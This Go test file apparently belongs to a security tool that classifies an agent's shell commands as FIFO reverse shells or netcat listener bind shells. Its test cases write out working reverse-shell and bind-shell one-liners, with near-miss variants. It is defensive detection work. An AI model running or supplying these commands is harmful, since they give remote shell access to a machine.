// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package actionfacts

import "testing"

func TestExactPOSIXFIFOReverseShell(t *testing.T) {
	t.Parallel()
	positive := `mkfifo /tmp/.pipe; /bin/sh -i < /tmp/.pipe 2>&1 | nc 203.0.113.40 4440 > /tmp/.pipe`
	if facts := Analyze(Input{Tool: "shell", Command: positive}); !ExactPOSIXFIFOReverseShell(facts) {
		t.Fatalf("exact FIFO reverse shell not proven: %#v", facts)
	}
	for _, command := range []string{
		`mkfifo /tmp/.a; /bin/sh -i < /tmp/.a 2>&1 | nc 203.0.113.40 4440 > /tmp/.b`,
		`mkfifo /tmp/.pipe; /bin/sh < /tmp/.pipe 2>&1 | nc 203.0.113.40 4440 > /tmp/.pipe`,
		`mkfifo /tmp/.pipe; /bin/sh -i < /tmp/.pipe 2>&1 | nc 127.0.0.1 4440 > /tmp/.pipe`,
		`mkfifo "$FIFO"; /bin/sh -i < "$FIFO" 2>&1 | nc example.com 4440 > "$FIFO"`,
		`test -e /tmp/enable && mkfifo /tmp/.pipe; /bin/sh -i < /tmp/.pipe 2>&1 | nc 203.0.113.40 4440 > /tmp/.pipe`,
		`mkfifo /tmp/.pipe; /bin/sh -i < /tmp/.pipe 2>&1 | nc 203.0.113.40 4440 > /tmp/.pipe; id`,
	} {
		facts := Analyze(Input{Tool: "shell", Command: command})
		if ExactPOSIXFIFOReverseShell(facts) {
			t.Fatalf("near miss %q satisfied FIFO proof: %#v", command, facts)
		}
	}
}

func TestExactPOSIXFIFOListenerBindShell(t *testing.T) {
	t.Parallel()
	for _, positive := range []string{
		`nc -l 4444 < /tmp/.pipe | /bin/bash > /tmp/.pipe`,
		`/usr/bin/netcat --listen 443 < /var/tmp/control.fifo | /bin/sh > /var/tmp/control.fifo`,
		`ncat -l -p 8443 < /dev/shm/.channel | /bin/bash > /dev/shm/.channel`,
		`nc -lp 31337 < /tmp/.bus | /bin/sh > /tmp/.bus`,
	} {
		facts := Analyze(Input{Tool: "shell", Command: positive})
		if !ExactPOSIXFIFOListenerBindShell(facts) || !ExactPOSIXFIFOReverseShell(facts) {
			t.Fatalf("exact FIFO listener bind shell not proven for %q: %#v", positive, facts)
		}
	}
	for _, command := range []string{
		`nc -l 4444 < /tmp/.a | /bin/bash > /tmp/.b`,
		`nc -l "$PORT" < /tmp/.pipe | /bin/bash > /tmp/.pipe`,
		`nc -l 0 < /tmp/.pipe | /bin/bash > /tmp/.pipe`,
		`nc -l 65536 < /tmp/.pipe | /bin/bash > /tmp/.pipe`,
		`nc -l 4444 | /bin/bash > /tmp/.pipe`,
		`nc -l 4444 < /tmp/.pipe | /bin/bash`,
		`nc -l 4444 < "$FIFO" | /bin/bash > "$FIFO"`,
		`nc -l 4444 < ./pipe | /bin/bash > ./pipe`,
		`nc -l 4444 < /tmp/.pipe | bash > /tmp/.pipe`,
		`nc -l 4444 < /tmp/.pipe | /bin/cat > /tmp/.pipe`,
		`nc -l -v 4444 < /tmp/.pipe | /bin/bash > /tmp/.pipe`,
		`nc -u -l 4444 < /tmp/.pipe | /bin/bash > /tmp/.pipe`,
		`nc example.com 4444 < /tmp/.pipe | /bin/bash > /tmp/.pipe`,
		`nc -l 4444`,
		`printf '%s\n' 'nc -l 4444 < /tmp/.pipe | /bin/bash > /tmp/.pipe'`,
		`sh -c 'nc -l 4444 < /tmp/.pipe | /bin/bash > /tmp/.pipe'`,
		`nc -l 4444 < /tmp/.pipe | /bin/bash > /tmp/.pipe; id`,
		`mkfifo /tmp/.pipe; nc -l 4444 < /tmp/.pipe | /bin/bash > /tmp/.pipe`,
	} {
		facts := Analyze(Input{Tool: "shell", Command: command})
		if ExactPOSIXFIFOListenerBindShell(facts) {
			t.Fatalf("near miss %q satisfied listener FIFO proof: %#v", command, facts)
		}
	}
}
